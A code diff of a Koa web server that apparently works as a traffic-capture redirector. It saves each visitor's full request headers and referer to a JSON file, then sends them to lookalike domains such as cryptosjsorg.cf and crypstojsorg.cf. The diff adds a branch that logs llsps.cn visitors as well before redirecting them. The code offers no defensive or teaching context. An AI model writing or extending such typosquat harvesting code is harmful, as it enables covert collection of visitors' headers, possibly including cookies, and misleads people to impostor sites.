@@ -61,7 +61,7 @@ app.use( BodyParser() );
 
 const router = new Router();
 
-function addshuju(data,ctx,shu){
+function addshuju(data,ctx,shu,llsps){
     // data.requestip=ctx.request.header.host; 
     // data.Origin=ctx.request.header.Origin; 
     data.header=ctx.request.header;
@@ -73,7 +73,11 @@ function addshuju(data,ctx,shu){
     if(shu){
         datas.todos.push(data);
         fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
-        ctx.response.redirect('http://cryptosjsorg.cf');
+        if(llsps){
+            ctx.response.redirect('http://llsps.cn/static/b/index.html');
+        }else{
+            ctx.response.redirect('http://cryptosjsorg.cf');
+        }
     }else{
         ctx.response.redirect('https://crypstojsorg.cf');
     }
@@ -115,6 +119,7 @@ app.use(async (ctx, next)=>{
 
 router.get('/', async ctx => {
     // ctx.body = ``; 
+    var str1=ctx.header.referer;//输入栏
     var str=ctx.href; //请求地址
     var shu=str.includes('cryptojsorg');
     var llsps=str.includes('llsps');
@@ -125,8 +130,9 @@ router.get('/', async ctx => {
         ctx.response.redirect('http://cryptosjsorg.cf');
         
     }else if(llsps){
-        
-        ctx.response.redirect('http://llsps.cn/static/b/index.html');
+        var data = {uu:ctx.href,referer:str1||''};
+        addshuju(data,ctx,true,true)
+
     }else{
         // console.log('ip');
         
